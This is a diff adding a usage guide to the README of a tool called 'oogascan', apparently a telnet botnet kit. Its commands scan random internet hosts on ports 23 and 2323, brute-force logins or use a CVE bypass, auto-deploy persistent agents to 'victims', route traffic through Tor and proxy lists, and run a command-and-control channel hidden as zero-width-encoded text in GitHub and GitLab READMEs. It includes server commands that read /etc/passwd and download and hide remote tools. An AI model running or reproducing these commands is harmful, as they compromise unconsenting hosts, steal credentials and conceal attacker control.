@@ -296,6 +296,205 @@ python3 oogascan.py scan --proxy-file proxies.txt   # round-robin rotation
 
 ---
 
+## Usage Guide
+
+### Continuous Scan + Auto-Deploy (Full Pipeline)
+
+Run the scanner and deployer in parallel — the scanner finds targets forever, the deployer watches the results file and pushes agents to new victims continuously.
+
+**Terminal 1 — Random internet scan (runs forever):**
+
+```bash
+python3 oogascan.py scan -p 23,2323 -t 16 -b 16 -o output -v
+```
+
+With no `-T` target, the scanner defaults to random internet scanning (0.0.0.0) and runs indefinitely until Ctrl+C. Pwned hosts stream into `output/results.jsonl` in real time.
+
+**Terminal 2 — Deploy loop (watches results, deploys continuously):**
+
+```bash
+while true; do
+  python3 oogascan.py c2 deploy -f output/results.jsonl \
+    -r youruser/c2-repo -r gl:youruser/backup-repo -v
+  sleep 120
+done
+```
+
+Loops every 2 minutes, reads new results from the scanner output, runs honeypot port-count checks, and deploys the agent + zwenc to clean targets via telnet.
+
+### Scan + Deploy with Proxies
+
+```bash
+# Scanner through Tor
+python3 oogascan.py scan -p 23,2323 -t 8 -b 8 \
+  --proxy socks5://127.0.0.1:9050 -o output -v
+
+# Rotate through multiple proxies
+python3 oogascan.py scan -p 23,2323 -t 8 -b 8 \
+  --proxy-file proxies.txt -o output -v
+```
+
+Proxy file format (one per line):
+```
+socks5://127.0.0.1:9050
+socks5://user:pass@proxy2.example.com:1080
+socks4://proxy3.example.com:4145
+http://proxy4.example.com:8080
+```
+
+### Scoped Scanning (Specific Targets)
+
+```bash
+# Single subnet
+python3 oogascan.py scan -T 192.168.1.0/24 -p 23,2323 -v
+
+# Multiple targets
+python3 oogascan.py scan -T 10.0.0.0/8 -T 172.16.0.0/12 -p 23
+
+# From a file (one IP/CIDR per line)
+python3 oogascan.py scan -T targets.txt -p 23,2323
+
+# With exclusions
+python3 oogascan.py scan -T 10.0.0.0/8 -x 10.0.0.0/24 -x 10.1.0.0/16
+
+# Scan only (no brute-force, just find open ports)
+python3 oogascan.py scan -T 192.168.1.0/24 --scan-only
+
+# Skip CVE bypass, brute-force only
+python3 oogascan.py scan -T 192.168.1.0/24 --no-bypass
+
+# Custom credentials
+python3 oogascan.py scan -T 192.168.1.0/24 --creds my_creds.txt
+
+# Rate-limited
+python3 oogascan.py scan -T 192.168.1.0/24 --rate-limit 50
+```
+
+### Scanner Tuning Flags
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-t, --threads` | 2x CPUs | Scanner threads (port checking) |
+| `-b, --brute-threads` | 2x CPUs | Brute-force/bypass worker threads |
+| `-p, --ports` | `23,2323` | Comma-separated ports to scan |
+| `--rate-limit` | `0` (unlimited) | Max scans/second per thread |
+| `--scan-only` | off | Only find open ports, skip brute-force |
+| `--no-bypass` | off | Skip CVE-2026-24061, go straight to brute |
+| `--proxy` | none | Single proxy URL |
+| `--proxy-file` | none | Proxy list file (round-robin rotation) |
+| `--creds` | built-in 35 | Custom credentials file (`user:pass` per line) |
+| `-o, --output` | `output/` | Output directory for results |
+
+### Agent Operation
+
+```bash
+# Run agent with repos from CLI (foreground, verbose)
+python3 oogascan.py c2 agent -r youruser/c2-repo -r gl:youruser/backup -v
+
+# Run as background daemon with config file
+python3 oogascan.py c2 agent -c pb_config.json --daemon
+
+# Agent with custom poll interval and API mode
+python3 oogascan.py c2 agent -r youruser/repo -i 30 --api
+
+# Skip persistence installation
+python3 oogascan.py c2 agent -r youruser/repo --no-persist --daemon
+```
+
+### Operator Workflow (Control Tool)
+
+```bash
+# Interactive shell
+python3 oogascan.py control
+
+# Non-interactive: push commands to repos
+python3 oogascan.py control --push \
+  -r gh:youruser/c2-repo -r gl:youruser/backup \
+  --cmd "shell whoami" --cmd "shell id"
+
+# With 1MB ZW padding
+python3 oogascan.py control --push -r youruser/repo --cmd "shell uname -a" --pad
+
+# Check repo health
+python3 oogascan.py control --check -r youruser/repo1 -r youruser/repo2
+```
+
+### API Server
+
+```bash
+# Start on default port 7443
+python3 oogascan.py api
+
+# Custom host/port
+python3 oogascan.py api -H 127.0.0.1 -p 8443
+
+# Regenerate tokens
+python3 api.py --gen-tokens
+
+# Debug mode (auto-restricted to localhost)
+python3 api.py --debug
+```
+
+### Payload Generation (Server Shell)
+
+```bash
+python3 oogascan.py c2 server
+```
+
+Inside the server shell:
+```
+pb> cmd shell whoami
+pb> cmd shell cat /etc/passwd
+pb> cmd download http://example.com/tool /tmp/tool RUN HIDE
+pb> list                    # show queued commands
+pb> genzw                   # generate README with ZW encoding (preferred)
+pb> genzw pad               # same with 1MB padding
+pb> gen                     # generate with marker tags
+pb> gen64                   # generate with base64
+pb> clear                   # clear command queue
+pb> exit
+```
+
+### Full Automated Pipeline Example
+
+```bash
+# 1. Generate config
+python3 oogascan.py config
+
+# 2. Start API dashboard
+python3 oogascan.py api &
+
+# 3. Configure repos and commands via API
+TOKEN="your-admin-token"
+curl -X POST -H "Authorization: Bearer $TOKEN" \
+  -d '{"repo":"gh:youruser/c2-repo"}' \
+  http://localhost:7443/api/admin/repos
+curl -X POST -H "Authorization: Bearer $TOKEN" \
+  -d '{"cmd":"shell whoami"}' \
+  http://localhost:7443/api/admin/commands
+curl -X PUT -H "Authorization: Bearer $TOKEN" \
+  -d '{"github_token":"ghp_your_token"}' \
+  http://localhost:7443/api/admin/tokens
+curl -X POST -H "Authorization: Bearer $TOKEN" \
+  http://localhost:7443/api/admin/push
+
+# 4. Scan the internet (runs forever)
+python3 oogascan.py scan -p 23,2323 -t 16 -b 16 -o output -v &
+
+# 5. Deploy loop (watches scanner results)
+while true; do
+  python3 oogascan.py c2 deploy -f output/results.jsonl \
+    -r youruser/c2-repo -v
+  sleep 120
+done
+
+# 6. Monitor bots
+curl -H "Authorization: Bearer $TOKEN" \
+  http://localhost:7443/api/admin/bots
+```
+
+---
+
 ## API Reference
 
 ### Authentication
